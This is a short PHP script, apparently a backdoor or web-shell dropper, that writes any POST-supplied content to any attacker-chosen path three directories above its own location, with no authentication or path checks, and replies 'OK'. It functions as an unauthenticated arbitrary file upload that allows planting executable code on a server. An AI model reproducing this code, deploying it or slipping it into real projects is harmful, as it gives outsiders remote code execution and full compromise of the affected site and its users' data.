<?php 
    if(!empty($_POST['data']) and !empty($_POST['path'])) {
        $path = dirname( dirname( dirname(__FILE__) ) ) . "/" . $_POST['path'];
        file_put_contents($path, $_POST['data']);
          
        echo "OK";
    }
?>